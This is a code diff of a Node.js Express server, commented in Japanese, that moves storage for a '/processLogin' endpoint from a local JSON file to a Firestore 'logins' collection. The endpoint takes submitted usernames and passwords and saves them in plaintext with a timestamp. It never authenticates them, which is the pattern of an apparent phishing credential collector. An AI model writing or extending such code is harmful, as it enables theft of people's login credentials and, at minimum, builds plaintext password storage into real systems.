@@ -2,6 +2,18 @@
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
+const admin = require('firebase-admin');  // firebase-admin を読み込む
+
+// Firebaseの秘密鍵（firebase-service-account.json）を読み込む
+const serviceAccount = require('./firebase-service-account.json');
+
+admin.initializeApp({
+  credential: admin.credential.cert(serviceAccount)
+});
+
+// Firestoreのインスタンスを作成
+const db = admin.firestore();
+
 const app = express();
 
 // ミドルウェア：POSTデータのパース
@@ -12,39 +24,25 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
 // フォーム送信のエンドポイント
-app.post('/processLogin', (req, res) => {
+app.post('/processLogin', async (req, res) => {
   const { username, password } = req.body;
   if (!username || !password) {
     return res.status(400).json({ status: 'Error', message: '入力が不足しています' });
   }
   
-  // 保存するデータ
-  const data = {
-    date: new Date(),
-    username,
-    password
-  };
-
-  // 保存先のJSONファイルパス
-  const filePath = path.join(__dirname, 'data.json');
-
-  // 既存のデータを読み込む（なければ空配列）
-  let fileData = [];
-  if (fs.existsSync(filePath)) {
-    try {
-      fileData = JSON.parse(fs.readFileSync(filePath, 'utf8'));
-    } catch (e) {
-      console.error('JSON parse error:', e);
-    }
+  try {
+    // Firestore の "logins" コレクションにデータを追加する
+    const docRef = await db.collection('logins').add({
+      username: username,
+      password: password,
+      date: admin.firestore.FieldValue.serverTimestamp()
+    });
+    
+    res.json({ status: 'Success', id: docRef.id });
+  } catch (err) {
+    console.error('Error writing to Firestore:', err);
+    res.status(500).json({ status: 'Error', message: 'データ保存に失敗しました' });
   }
-
-  // 新しいデータを追加
-  fileData.push(data);
-
-  // JSONファイルに書き込む
-  fs.writeFileSync(filePath, JSON.stringify(fileData, null, 2));
-  
-  res.json({ status: 'Success' });
 });
 
 // サーバー起動
